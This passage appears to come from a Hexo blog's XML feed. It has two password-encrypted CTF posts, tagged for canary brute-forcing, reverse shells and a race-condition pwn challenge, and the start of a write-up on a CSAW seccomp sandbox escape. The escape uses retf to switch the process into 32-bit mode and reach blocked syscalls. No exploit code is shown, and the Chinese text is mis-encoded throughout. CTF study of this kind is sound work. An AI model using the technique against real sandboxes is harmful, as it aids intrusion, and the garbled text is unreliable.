7d17f02d7d2e83526ce80cf7926a1ea222d157fb5991f6100839a510027c15de32828a8f850d6391edc0e8bd935f2b5847c38d57a5e2af0f4ddc643b642084e263b106a4d44032f8ce8056890de55cd42b66a11a7922b5865d802a16f71af1a6fdea9ac97daf3a7cd25a064d0ce2e1016284fbe4d82ad70634fbe1b7fed746b691048f1934fd723f730ea8c4b176479f3ef34afbcf383bd7fc266ab9d307b4f24c7138585303cdb96e7a5546c64cc17de3f0dfb30eefd3003526829ad34ff7f1014e9179299acc89a8ef05d079df29f691eab5a2f31f39fdd49274d9c695aa4e3e35b57cb66350e8449b5ef6503b42078ffbf4c702ec9cf2f41fbce6f55e10562c58602c73b5adb7b4eea58b96b84e92185281f55bf47de279be9ef9c9158f17b95183e63e1246ab040b801dd5a1423b062519cae31c76ae4e81fd1a82ef1e8b9c049b52d7f942aaf3b228125336e316e8edf02ab7ba5105e80779721df152e4e00e98a969fec2d96789d025a91c781f57296056ee7809f9b50612e09fc7133ffafb3114abd67d488b7cb9f0831d7482c543c6b956199b966b3a71ecb7907cb20d96b380045c52c3a03fac113cb79dd0e562910a294a37d75701eda8e4ec95a2784c241d942c918b4e16db906b2024601fee73afafec9982abb9776e22cba5a749bad5a34a341275f1a5343451ef766f600cebd088b4ec2ea9179bd3defe6fa5c1dfcaf9462a263dd6e3e2fe90036c205283801dee9e6eece4b9c3169275ebbb874d87a371a84af5cda376b2c5592391a7845db3d413cb0346d4999ae94c901b0448ae2578a77106b3dba1df66373c0badc3e2c043c12573d9e04647b29d75b7b3d8b79c6521f63e522d008b695ad06066806f9534ce22df4c2072923ddb0005291b716ac7db9d9cca89030f2dc2e2f67adc657cff6110d718a8b058d61a3fe6b98c38dbee7acd9662a5b1aa62539a65fd3ffef6047e040780ccf7c578878b14d3c0dadab7e8a0325fd34e0ed37a4a7aff589e8f65c346c77232af494f0b2d872bff458b71d5e8ce0444851c17d53f6fa5bcdd8a9337a2a958f5925cf5d0b83d8625a8225d3dde395376d88c2f205cb9042363b246329c5115f6b7223ec91ddc7467d5e2600bdc089b4ce5fdc17c65ccbebcef4f23b2730368f4c906fdd61223b4f19a7cb5c7e66d05fc1d29d64153eb4c89a01461ea8bf1a65adf10290ebc306d4cc96a95697c10fe3ae827aad99861de80d59ea6cd9a2d8f97c4b549042356595cc4dfc913629f069a7ee4619d8c883a20abc1e4b233353076002b2f5c417fddd48d0f1bd64faca49b3c7d89c9c738fba3a16b7c026ba1c79b163b4a272ddcc10ca8820b7a9cbbab5402f4ed419f01dae631a066e96ebf024eafc56a05a7c564f4692658250cf93ef35d3b45b7937c154952bb923c297f365fdccb37f6a74459d06a9f1dc6831a745e580d47634be2304d2d5ce0897b3c48c3628646791ce08d4d32d7a0ed26fa0fef3f8211004f2607b7625cba909424accea8dfd892cba36204b3e186a4613ae1811b254dd844f7ac116685ba3d01238ed12b8e2534c4e3012f761430024629612ab6d630fde341ee579da7bf171e7936eee295add4069530d8bdd9c481c0672f844ecac96e25229ea3bec336af70839a684df44fea5adfbef7f782a88cc71fecf9db82b0c5b21c0bfaf51310c5b8eacd1d4820f5fd01f61675edfb9bc231e839a3413b796ab8a240f3eb0443d7028d1d16d7c1c29cf0d66e2f9df3ffdce7320884fae298d810b0987926c81414aef1aa5fa27d62ec3d1a172b6f742937a3c918962388ce9407830d308ecd91b3846dc4214bc6f4941fc67a9392328a8cd9f181b183d5528f084cfa1d29df1c65dbe37e3e639e8fb99355ae7e8fa8c2d69dff167183a8dfdb4242bda30a034496aab055f4212c32a458bb5be592f8f01caa94693ba06d150460369e9f2fcf2b4cb90fb636c759bd61e0ced2da3908f54f245e98223013f8a1587a57e6ffdb6ddd08a33d5cbd3eb937209fb55eaa34759042a8ee96c7374ded2ed373701ee461de285d63080cc1fdb3da9efc499b3fc86580df26246fa152a0da4dda3c2001e895a673e0ac601c2421dcba4f2c39cad72623158c9a81313c796814abfad92f75178362abff21aa14d9e1eeb7329c29f53429af56de1718aadb0023a408b66f6fd9ebce0f1e4efafdb659a2e12b52d9583471edf8d2d5df48c8e1eb6368b810b5d2bf8ee27e90a5fdb36ac1589f9dafd0c5664752743696b2efa3d9464451f2b4ada52276d5667df78cc7175f1d50f857ab289b1f75ef76f04a74747c809a34783de4846083aee04419fc19fba0a8a829efc0e4b289069dbcc0a372d91f5b7b65ee631445b2abbe8cd32176a130f66f7ecbba5c6fe4626eddfc7e14a93472edf039053010d1c0254d47de270e9c4e42cf7e573d4557e27d024bf7f89279bc8776ea9ec112d8febc7a2580a1a66adc0cc2875db718ca9d4af47b0001942b16f77752eec66b32b539d3d3546e3d3a328b7cb40b05c5011ba38755dd9e3c06f548f05ab8205c466e2ccc7af3db7ea5138601a69049d13c8b03abd182c7ec988ff629bebbc43d3855f4f05ca1f5ac0bd6aad04eac2e520dfe8def514423cde0f68810468e1c80e9ca44d9e3a497a9f9bdbab56ac99729c711335a201852d24bb8dbc66814952f1ee7fbfaefa10c51b5ae417d07de3c24a9122091ae3b9e59589ce35b67bb098f2df75625ad33e4d1db571cd5bbfb03fd4fc2e08c56ea49e255bf8f7d56b791efd0ac20fe21ed6f4972cad7ba42dea0e4de2bae6271ee3ccf1f36553b21485644590d6475b5481096afdc151a49a7b86c3133d38576dd0320e0a1fd619bc6f48e79988c467cbc586437bdc4e590efd9e65850f80c096be3faf06eabef43a5e7da45cb5c825a58b67b764ac197faa29573fe62ec7957605bc8462baef926c8aa2c5a4ae5720cd603f0bcd04f03aee64ce13dd6ae72d5396a3c0e402760313d4e8e42d6bc5207a3fcbaef3200b37f0d1a0ed7733016c1515f711a70557f91fe8feddf98605480b1feaa76e88561b498096f3499242782a3161773a76d8ae7b17e32ffaf19ca85fcddf53b62863c8e744497246ef8e18e39135cdb43dd8351b035153cdebc7e21d84bbdccf0b205991868aea1fafa55bc293b17b549b12a7d04034e1d56a6e34ec1c11c2fcfb974b65d333f6f692348632b337ebf4c48a9e1cc81f17f4b86d69046d900bb89f8a8e980b56fd4ec954e1cfde81aed5a922c029930fd697106796c61b83a22bedaa5d74060622c535ab813f366de8c3c53a75466d89ab39476926086e75ea98a3c8347de6d7b6aa25d4d3395ce98fbcff3df7dde038e00d6796e2ba97b5943c1fbda49e80d03e35e79d53eec3ebd58d51f3d42447b8fbd8f9004008b616ad40e235102f9d16e911acf9306985e34da8121d094a5a11841d7c1a81f257b6a840a3c6f927feb95ea5dbf6a17b36439794598050d7e1529a4f70d643db1a8d25ca75c7ec849aa8b369eadf406e75ccb788e93f2cff2b9909be0a7b1aec492e47e2b56107d0ba076348b735461df2cc3a8773431ea4860c77563e19a6d2725e211b7b012bc0e8b4e45706aa03bc5b4953d4424bfcfc34bdcbe1317c4f71a02fb5a8308d8513e905542b6735dfd3b52b1232b3a52c582862006d483da643e46bdbabc835c9cf99b22123b2216eeb94f67b19b7e35fa44ae8e6772507875045ac66be5164a1260c91e1e9f8beb103147efd3cfc6d46bb1a6d79f941ba8948984473d4e8129c3704b1c89d1d08be90a31d0019f71065a607479f02124a606826e7dde4d91bd815dea813fa5e632ccb41e8d9823cd23f7d39fd07b416050c470fd0c08f5a94b27013210396b3861679d732757f31865b969b03608a4836db67abb6f7374b717eb08c484a5c691a6deab2d3220981b6a31e820aae6a3cedf62bf95c94203c251b1b5bd2abcab32c3f1a3b2ace3500b2ecb4a32e391a0dd056f40fe36248c7ba6cb6a96896688c0eebac200eaab069d0041c5fb5696f745989b26e1418b9999cdc08e4a43fe90c6aafa13bacae0b122c79dfcca615b02dabb92f57c265d5812673f83f631e650a0cddd0d3ed94f13b35b6fab11c445a06371685e17c8b9fb5213f286bf6140dfec24a23b51b633a4f0edbab333f312c926fd8f4083447536a28d2741f06b01e9f1df99c94f6adc824720e9b92350abf35d7f0d68f4c37a45e2d4e6af2de3119a03ebd2c4a2e33271a12438146e0476b6ccec9fd3b57c7c6bc2ac7902f19422b2684f8341c0699c3dc181d48b3822a756e1e81d407f143cdca64c6a0bd16029a6ff80cb91de8bbfe4249ab59a403c14718468be1c66511a1bf9b78fd9fdc7d9d97499ad56e5fa4706f9aa76bf8d2def6b71cbaa35d3b031c29a10e1bab51e8ec3cf28d01ab568d0436310cde95f8fc53ab4db19fe46c5fc569f16d98b85885808fcdfa8fda71edbda95f59356c5fe83a0aa3e1c3622cda943aea0e8c2ada22a6a8cc4551a84ba1770c6998751461916ce3485eeef4958c6dbee35db76d86e7514dfea77ab89902d9f4b9d494b795ee1cb122d553fbac5251228ffcece82406b3662860922e2eb46dd588003dc84b98aa07fd8e51d57b6dfc781bd79e46b422ddc612432fb8d9dd9c40c77380cb04dd65e1440cccd6135c98dc6e829a59d70102d1cf8a43185d9887c858082d543da9c97141e23f50c36d6aa647d48fac88a90a9550180a6a4fc8967f9b2a71eced0ef56421934c0a6d1bfa1234ee3a20942117177499bacc572dec59e9b7cef820abc727db50c2c19a09bd500ca43daa29c26bc41e4c5e8294125528c8bf766f689288343343ef7aca9bc81a3802b35353984bb75fa0e098af9e2f23d8d9e8179411800d92a5a738c2c0e5509c7a96b000de3023526e07581334b016578372d7a6512a29b57c4bbb52da47ed7841377526613ae3b12d6b5565e586a5465dfe8a795bbf092c48e8750ea22c85315e104e725e5def6671108c58d66655f701f6f4b8d52af81b079ff03d2683310e4551828b8712fabe8689eb9ac2098c7fe933f3964288ea16ad594d81ae47d3d9ad688218c4de7fc9152e584bb481da6d643256fc4ef7bf38753c7d954a3f36df96a8d7165d7b8fed68b839e300b8247f8a7352a3f5859b3845ef3b4dbafbbe7d07f2011aaff2d63f127c0fadba9397a2d191c081d04fe4caf31bc0bdd563175452a7a5fee6c16eacea8a6ec25427ccd454d81b5f9f51e014c506ca235f8bce831720504fa463523e1e4bc9b04efef802cc97bbf6441a8344e9f7b6791e355ec7d11d9fcf67a0008508a5ad0c45acdc989c32ae3b677ac5e859a9c9006b85f7da2c719aa87ec5dc424e451b1541e9ab8a6531b81741ef2d0657aaa289b4c856c444f2a4bed6d54fd844c41a6433b221e4f72489cf2dca3db591e1f3d6636967d55fd17ed16c858da717f0cc034d69a96a01ade2a633a12fb39711d05d2f37a5a608afca0b3ba34215df7d4eaa10a8ff629145cc4eea6f315a8995ff9cc0e17a83dd472b61b2a4e9f8e506f243a72e9194f9a98e331011e65ec4f3126cd2fbdb91ef949b123f3fcbc462cbd9e7fa8e91d8b4165367b138a3662e6e5e2d833da171b46bfe2ec0902c1d38eeb00bcabd3842fef7ea92d6bc2989b97e1691a4edf908ae70cd3a74d268987e1fe7b201b08ab4162c8d768ead3e05f1296ee41334692e0e1bc7b0308f3b9d006be51c808704c4cddb9ad48e0a688884d93f95a15704d30de61e8d2c714dc621a405dec2e2c9b11144b991d9de2dd372b12002730b1317959f138f9de61cffb4e27009e83718104d7c2370c338a78d7a87b271df49d03f09a7f85492655d482ebabe486ee3a84b91cc77f28d1065217491d557b879e5e428fb76f139e21f3943add5ff8b3086898ab00422eaeec1371e00ff20516c6f857006e2d8c9177c7099a1cca0d821ec038cf9b44d1a131b8bf37fe7ea9c83a13ed88d4bd16c3ab2345a2db1eee236231657e03c7280ee2f8e6b560b4cb6d74c6a7fd2da4e067a1b0b31be090f96446fec8303cac2acad04b0d8829a5010d5ccbdd4a01d5e10d3f7d92a5ef6a15e5d8bc0ad12ac7006b565ae95be179b2952197a84296d1fae0d55ef9e1e80265be4fcd72</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§æˆ¿èœ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> trick </tag>
            
            <tag> çˆ†ç ´canary </tag>
            
            <tag> åå¼¹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºæ¡ä»¶ç«äº‰çš„ä¸€é“pwné¢˜</title>
      <link href="/posts/e0e031bd.html"/>
      <url>/posts/e0e031bd.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9dd5b62cf51b48869bb2a4e213da294d01105e027df0226e6a68814f444c7abe">0e96a196e04ab582d32680aaeaf05fdc17ca0dab161dbcdfb87aebd3e10cc06b66c35dd5c42d7eb805acdf59d1a3c9f99f0d2dfce7252f682ef8d4bf3f7116f6558d7f921854cab2e8d33bca9f0d7bc72c5107652ada0fdb708252472ed4c5c9d95e092dab67adff4f8625baaf133c59535f3b8f1bd3cf41d3a0e5b3864ff319a4a85f4d4b3b40b46aa81cf1c197ccc2b96b98caccee5775fbe2b253f90935c6dab7381346507f79948aaf48eda00d87b728383f4258f8df1c62fc4aa8f69b335132c915eff6e0e1515e0dce74e89ff846e24d13a8a5c3ef42373a714a8f8593f81537194eaa543e3c08f753c5cf982ce95e0ab0fc78eb66040635a35422525a05855ab2dbcca6f6aee33d579a3577e8f0b2c917860ec3eb014decadca68bf72fe49eb4f7ae870b209ebb162683b40e5dec34a43deb9748fb6c8e9dcb95a2e8ff856b243fbdfd42d7aac10b19e890b206e1832c2b00a1119699c79d3553823655ba530ea3a979107bac709fe317b24a0e5c59bbd0834f2bc1158205c1bcc4c0199d8fb2bcdbe1cc59c3dd9b7616192966c335734b3e8ab48b3871cfbe9b150efc7f320107587721503ea94f272dfa05c0c12ec832524cdaec099f356f70b99fc80d1e460f6e0e12a7fec030ed101922db4bd6807f258ccc3c8b64b8f12e21f6806381af3922d692040450275a3ffd00642476a964bda011cb6a1e259158d7e3b59ac1819319e74e6f707d87c1482326e3c4fccfd427c9b8bca68121967f613a2c26a2b799b40af1efc4705e4aef397633742e24f48e361d800c7ce8c06ec3c2bd0058c686a28f1125035caf44a4840385f8ebca3f955934a32e5addf1fc9f0ee30f0bcb31ff0dcff98f62dd3bf4f87263046e983c869517f1af737ba803d145f10740ab4ab46ec5312b83b9669a5307a5c0571a2660f40e11c0d3d47da04e6d217ad13a20a01737395a275611a52be8591e2189755c84627aede31a0ce0762d63129a532e087de14da85961cff8f51dad9f500b631936f6363bf2fe6f2c0eb9f7c36d49a178bb5203b503bf52f97d155351461113384ad51d46bcab8a0003899b6a91f683e9ef2b824a654f1f73833d377642b9245375c00abb8980018f4703611c0e11f11b81618105c667049cf77930c2002eb5984fa9cd1972475311dd8229453aea4048e6878e9cab28776edbb3944b3d33f2008ec3b0453c187e1dce1e4754bcf89a4a3d09688512f7e5adbff5e22e4677371c7bf38c1ecce515101e0e879883d738725460a81442233c04c37623251112597b513a7046033592afc2474d7c3fcbb1825e37795f05ec5f6ab646b795e494fb320cd49fcb41259ced0ea1d409c871fc2ad93b94f8333eeb7d85ee2602dd473cd5aa80d53908572fc354e71008e0f6c450cbb94e6bf7a469d3be0e73c2d6e79bb3c486e30d546805a11f7e7622ff9036a78dba28e81a88e899188d9671df9f97c9fc5079e3349429085ec9dc54df43b8b6982b6986dc4674e370d24c9847bede1dd13f6ec3cdc8133d4d38d9968383abdec4a0f0a37fe284bde2a02d78f342a86fd4ef55dc0a60ee00affe42b31ef5c5bb328037a0ccfe4ddc66acb3f0679db5913dd3948dec3e157dcbb601b32a72ad8417cd7ef0fac6a999ff36b45e4511691ff5bef6ab4e218284e9c68d12f0a6962560e325339ccbf471b00d80fab00ed19adfb3b2e02c8cabfa3ecd97143318bc60d5f872f9728262d233e71cf2531c5cef6ceebef665ae54c123c7ef39e4e350ee120a62477972caee377e4ebd8dd589067743e28d804d54dde7b2fff8273e5db09f383e356ecdce81723138af735b009cf78a1dad971da5a3761b015b52d0aba592bba49f54efc9b2b167502e0bef4cd4d2174a56a42f1ad6d17fd768e1568de54fcdba547cf0d3d8915393492f0c24750fabe4130f5a672e27c2061a59f867816131bbd82e1b860a17d129fd5055f502a0eff1819e0056df17892e8693fb3a1eb8b39c70368619bb7b54a95bfa7d357f07bb8baf331e0dad34b544dc82d5a825118a207f4398b4b0786fef42609d3531695631e665cc7c19132d8fd08694d4fcd7a733f74c28da22f2fc20a851b17eb4e37d8cc21d7f9f179d093742652da2ac538f341314fe0dea68561391eb9c1d1bf8e23d389d7d3cacbd0ef2d854a225383c9cd512f1cbf4eb914cbbee1031894b06af8c4b2222cb9df2ff4423204fa8542876a69eee607582c107624d9f72a64328d10d62935f63e7c253d270a9074d3f100bc5328c378e3e44e799fd26e86dba7032b90cf2383e70745b99458971c4647d90c8966337549ec07d6b40a085aab379b3d214923f57cbead8cad721b559d865e2deed166c17b7141e3c3f2d4aeec256fee3b4e4a8d7675d25368e6767e545e2cfc65aa91c495582bea07dda467208da39d019881a4c6c48401235690de88b4bed023a0c608638986f79f68d758f55ddbbbdff8886453db7d37b0e4ad50d2fd167487f5c94948bd304a61b00d020161b98e29f7787b1297e315593cf482b269222fde50ef5c989ffc88def532c1c1fe0ce837ff67ed6fe1c08da8e774b67f016904f4aab66164865fdd244ed0ccada470cc792d760054e3cff28eb15fb1d28cff859db61ac065b72f796ea38bd511e0678c03f93960ca2d40801dde32e35f37eeb5928d3ac4c35648447b6a1ca45c3476dd9770cd12ffdcbc66584912e0c2e6325b9f41feab72bdad62c8fa35727b22e19322f224baf3eee963578eaad643b1de2ee9567e75f9beadc4bcf028d8e176767558119756453b4f7f93d99e9b7a7453f07dabb276af4a0e09ba6aca4e05259be81bf79eccd87ff5ac011c0818a643eeec6d59e432140de4f0d580c1e4a5adb6bec8ba21a450e89e62b14da173a05ee43f620f10d9a1f920ae5740e5a6da833aed4db63fb526f61ed37b710ca5cd2b5cde59f373d0420b094ae3faa9a051dd2540958dddd2ccd1996446fe18cdce921874feab2f882dbea4ba5d80736e397ef653f855b9bff83a48b0846213b01cbe631ceb1f05fb1376bba109f9de62ab0bca542f36ae41c526f70306cf09d041df59ecde9272dc2a7549a9a28fbad9c76781176e8926654e2d2e2fbd1aa992c64362ea3255f1e22d1bc346ce0706965871604f6704ec470e58121235090bcace390130d3f70172eae52e7dd8b19f56b5aa90bc0e0c52d3d5ac1b128cded1ba9494bd4aec564dcd25028500deb1ea2d35e8a74bb15e020d8dac0fab8a417fe36a68a572a20539c9ce27a436b955255409af248105ba013c70ca2c23a747ea0b0bad20fef4f506bb27f786b1f84501b5ffbf5dd7c8e2e1e3ab8756c8ce72aa94727723301625c1ed7eef77eead63c02cf98ff139a57f2a536254269d72bea7c4fbae2b457ff9cf1dc4315836dfe44fc6b2dadd1f864717d7f8bc75eddea7d51b5d48c158c46982bdec6de2071a2091b7cc6aa3795252edc3e5c760bf58782231a41fd2a9e05634a2ac90a94ce8e861d0c31531b36b6d215b684f2aac6021304dd93e56dcb38fb65f1e4cfbd8dc3bc53018bbbaecabe212c1a41fd821528769d8a257719367698d747656203ed70cfb5d071ef153ee232967ae041fc4945e63fd5896d7fdee57a234ea108708d757e1b187e8ff7d70d62b574d351bc5be5ed0bca41f83929b4d1fc82674f4599b01b1904524e8b380877b6336f75d93f0a6298750fdffb0974c5fd41e8795fbf1f505192529aaca6a19df7d1e5eb09c20b043a5c841fc97f2517c52b564bcc18f962e3be244a4eb34d876ffcd7d27c3ace2cecc14a3e452aa887f721f7d44dd84a56c1d1640d6df9d13399d8ad3ae7f7c0e50c5f852ca694c18d4259c308c5cf512fcf171665af922e40fa7d02ba8967a31c43308ea77c8035e2106b8df8fcbe6002024a7d3baafea3d91e62a597ab1f73d1ea8502967f052b10c55fa059051d5cedbadcfa24a0fc0871a6177e40fed8607bfdebc959660643c7e45eb66665f41dd02d8e3bc511d92d146d0e11e5363683554e4855b07e194888bd5b728dac729fb71df32f90ffa456a6c337c38c943f34d964d0bc2d1168b538f4b4a4cde7aac093a83b1b922d4aea51773e290bf309a0bf01ef48ebd201e4c8d460d633317fa932f04d7ae27b595c3599c3316511a2beb64f5828b7a0b31909be24294b93d4e3e4bd2ebd0311e8762bbfafac90422319ed04be30a5902b471d6f058c96564b13e0ef2f27f6ed6ff5d101a499c96a82547ee1720b9d1151275b32a785daab5ef3be55bd1daed429477484729b272b2f26c7dd9f66d41255b449f23d40dd4d8a018952a988478c2661523cc868a2c62d8074e50755cb3eb3d2c7099cb3e2249852d4b9cb6e29b983700ebcb9e9144b0a3941ca7808fb9a040710876bbbda752adaca203058c81d7b0fccb43bb78d2747ed4e27a8393edcf1ee442b1185c36c28b273f5d7c2cf50b73e4ccc083d90bb61174bec9edb989d17baa8bdb5fd1b938ccffbeff9850a785b6d30d537f7e5e367c2d01d2cb7e2efbd7d7ff3f65d0d3a6bdc3749b0cbf2098e3420dc2b32726e8b784ee0a5acddd2526009540fb2a79defdcf5736969686925f1c0a11ba60845554965207bc23f93519e69891c12107574cb6c895ddf6665b3e6d587d141b07c85966d9c4770747e385bb82354ba48019f1f56e3e456430c59c429b184f25ff3b5b6be633028f5a2e59df6c88e8dabbb2aeaf33e7bddc7e89c47ffe4861495c7aae8a1a71de584f3c208f820d6fe9541986a48ffef0a8cabf91a7a049d8702eb9c95fd85543c66ed04310d07a4eb18a3374fd86810f2d3e1fa76e39ad1d00645765239d9c9a0a87d0f9cff2a0d7715233bda7e20bcb34fce66497c115af443e54062285546b416b415ccdcff54b76a5b84622e59e3b6724a8863adb8cfab40cc2a4dda5b4af7c057cdf1fd100e81d4aa734906a6bb3f9ae5995493cb86a0cafdf370cb13e9ec201093b11fd4935bf23a4ca729cc1754a02ffe2f524d95e10aba02004d8e7998002af8756c702695940772d07f69b2a25b0f0b9b6436b6b7ef74a93569f6c44e9e92115764971bb3af1c16ba5f47376e71081f8a4acf5e40ad532fc0f2bedc12bb7efe448f72dedb476783168bbfdb543eec48436205a8e562e42219052372a81f7ad8a3ea5478ce88f7eacde95ee0b971df355fc693655d8b2105e0d5b616156b3f92410ed3935dfcebe6e7991c1c5fdd3ffdf99ba6b7b50c2b4e4f9646e5f2897fb414ff3b49c71ecaee5bf8db110dcc2cad8c12cd69d57f2794f3d5915f83a34ddd9cc9c078010efd1f9f98a5ca031df726a1e446f1b6213bc00dc4d45e026e1918be6d04a1c21b1c5865bb6652cdefdd07640a7384a4485a20d3a2be241461b6b74a04f52c271efe426f222665a138de82859386075ca48a48879f8527cb8600657a9181d959cf1e23b33d80a72098c9a132536dce497106c8fedd7c1461151e382a2be04263144c8c3ee93141c1b5582b0bd642268cbd9cc8187a762f112bd9b20ccfbd05c809e114c673d295bba1bdf8be4f6c4adfec5845d1c7ebccbf14550b2e1b68848b0af882288d817bdac44719048ca48f8737976d9204d798ebc9d4fe3b90f1d4d49935402847f0509f9829cf6bc8ec407009cf1f9f9aac2965b9f734a276d6dee05aa25d4dfbf1f8df29e1dd30a0b188e63416f7886c864b1914e6c68b9e9025ee6c57cb504860ee3bc330248be745cfbee9ffe</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§æˆ¿èœ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> æ¡ä»¶ç«äº‰ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ²™ç®±é€ƒé€¸----åˆ‡æ¢è¿›ç¨‹å·¥ä½œæ¨¡å¼ç»•è¿‡</title>
      <link href="/posts/cb4bda90.html"/>
      <url>/posts/cb4bda90.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢ï¼š"><a href="#å†™åœ¨å‰é¢ï¼š" class="headerlink" title="å†™åœ¨å‰é¢ï¼š"></a>å†™åœ¨å‰é¢ï¼š</h2><p>è¿™ä¸¤å¤©æ‰“CSAWåˆå­¦åˆ°äº†ä¸€ç§æ–°çš„æ²™ç®±é€ƒé€¸çš„æ–¹æ³•â€“åˆ‡æ¢è¿›ç¨‹çš„å·¥ä½œæ¨¡å¼ï¼Œä½¿ç”¨32ä½çš„ç³»ç»Ÿè°ƒç”¨å·æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œæ¥ç»•è¿‡åŸæœ¬æ²™ç®±ç¦ç”¨æ‰çš„ç³»ç»Ÿè°ƒç”¨ã€‚ç†è§£èµ·æ¥å€’ä¹Ÿä¸éš¾ï¼Œä½†æ˜¯æœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œè¯¦ç»†çš„è®°å½•ä¸‹åˆ©ç”¨è¿‡ç¨‹ã€‚</p><p>æ²™ç®±çš„åŸºç¡€çŸ¥è¯†å°±ä¸å†ä»‹ç»äº†ï¼Œä¸äº†è§£çš„å¸ˆå‚…å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚</p><h2 id="åˆ©ç”¨è¿‡ç¨‹-amp-amp-è°ƒè¯•"><a href="#åˆ©ç”¨è¿‡ç¨‹-amp-amp-è°ƒè¯•" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹&amp;&amp;è°ƒè¯•"></a>åˆ©ç”¨è¿‡ç¨‹&amp;&amp;è°ƒè¯•</h2><p>å…ˆçœ‹ä¸‹ç¨‹åºé€»è¾‘(å¦‚ä¸‹)ï¼Œå°±æ˜¯è¾“å…¥æ•°æ®ï¼Œç„¶åå°†å…¶æ‰§è¡Œã€‚åœ¨æ‰§è¡Œå‰å¼€å¯äº†æ²™ç®±ä¿æŠ¤ã€‚</p><p><img src="/../img/2706180-20220912231002326-165259550.png"></p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹æœ¬é¢˜æ²™ç®±ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨(å¦‚ä¸‹å›¾)ï¼Œæˆ‘ä»¬å‘ç°æ²¡æ³•æ‰§è¡Œexecveï¼ŒåŒæ—¶ç¦ç”¨äº†openatå’Œopenè¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¿™å°±æ„å‘³ç€orwå’Œexecveä¸¤ç§æ‹¿åˆ°flagçš„æ–¹å¼éƒ½æ— æ³•ä½¿ç”¨äº†ã€‚</p><p><img src="/../img/2706180-20220912231014492-423761031.png"></p><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ä¸€ç§æ–°çš„æ€è·¯æ¥è¿›è¡Œæ²™ç®±é€ƒé€¸ï¼Œè§‚å¯Ÿä¸Šå›¾çš„ç¦ç”¨è§„åˆ™ï¼Œæˆ‘ä»¬å‘ç°å¹¶æ²¡æœ‰æ£€æŸ¥æ¶æ„ã€‚å¦‚æœæ­£å¸¸æ£€æŸ¥æ¶æ„çš„æ²™ç®±è§„åˆ™åº”è¯¥å¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220912231025985-268851744.png"></p><h3 id="æ§åˆ¶cså¯„å­˜å™¨"><a href="#æ§åˆ¶cså¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶cså¯„å­˜å™¨"></a>æ§åˆ¶cså¯„å­˜å™¨</h3><p>è€Œretfè¿™ä¸ªæŒ‡ä»¤æ˜¯ç›¸å½“äºpop ipï¼›pop cs</p><p>è€Œåœ¨x64ç³»ç»Ÿä¸‹ï¼Œè¿›ç¨‹æœ‰ä¸¤ç§å·¥ä½œæ¨¡å¼(32ä½å·¥ä½œæ¨¡å¼å’Œ64ä½å·¥ä½œæ¨¡å¼)ã€‚å†³å®šäº†æ˜¯å“ªç§å·¥ä½œæ¨¡å¼çš„æ˜¯cså¯„å­˜å™¨**(cs&#x3D;0x23 åˆ™ä¸º32ä½å·¥ä½œæ¨¡å¼ï¼Œcs&#x3D;0x33 åˆ™ä¸º64ä½å·¥ä½œæ¨¡å¼)<strong>ï¼Œå¦‚ä¸Šæ‰€è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨retfæŒ‡ä»¤æ¥æ§åˆ¶cså¯„å­˜å™¨ã€‚è€Œè¿™é‡Œè¦æ³¨æ„ï¼Œå› ä¸ºæˆ‘ä»¬åˆ‡æ¢çš„æ˜¯32ä½å·¥ä½œæ¨¡å¼ï¼Œ</strong>å› æ­¤è¿™é‡Œçš„ipå¯„å­˜å™¨åº”è¯¥æ˜¯eipå¯„å­˜å™¨ï¼Œè€Œcså¯„å­˜å™¨æœ¬èº«ä¹Ÿæ˜¯å››å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦å¾€eipå’Œcså¯„å­˜å™¨å¡«å……çš„ä¸¤ä¸ªå€¼ä¸€å…±åº”è¯¥æ˜¯å…«å­—èŠ‚æ•°æ®ï¼Œå…±å ç”¨ä¸€ä¸ª64ä½ç¨‹åºä¸‹çš„å†…å­˜å•å…ƒæ‰å¯¹**ã€‚</p><h3 id="æ˜ å°„å°äºç­‰äºå››å­—èŠ‚åœ°å€"><a href="#æ˜ å°„å°äºç­‰äºå››å­—èŠ‚åœ°å€" class="headerlink" title="æ˜ å°„å°äºç­‰äºå››å­—èŠ‚åœ°å€"></a>æ˜ 